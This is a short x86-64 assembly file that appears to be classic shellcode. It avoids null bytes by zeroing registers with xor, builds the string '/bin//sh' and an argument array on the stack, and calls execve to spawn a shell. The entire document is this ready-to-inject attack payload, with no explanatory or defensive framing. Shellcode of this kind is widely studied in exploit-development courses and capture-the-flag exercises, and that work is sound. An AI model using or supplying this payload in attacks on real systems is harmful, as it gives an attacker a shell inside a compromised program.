global _start

section .text
_start:
    xor rax,rax
    mov al, 59          ; execve syscall number
    xor rbx,rbx
    push rbx              ; push NULL string terminator
    xor rdi, rdi        ; warrant rdi is zero and no null byte
    mov rdi, '/bin//sh' ; first arg to /bin/sh
    push rdi
    xor rdi, rdi
    mov rdi, rsp        ; move pointer to ['/bin//sh']
    xor rbx,rbx
    push rbx              ; push NULL string terminator
    push rdi
    xor rsi, rsi        ; push second arg to ['/bin/sh']
    mov rsi, rsp        ; pointer to args
    xor rdx,rdx
    syscall
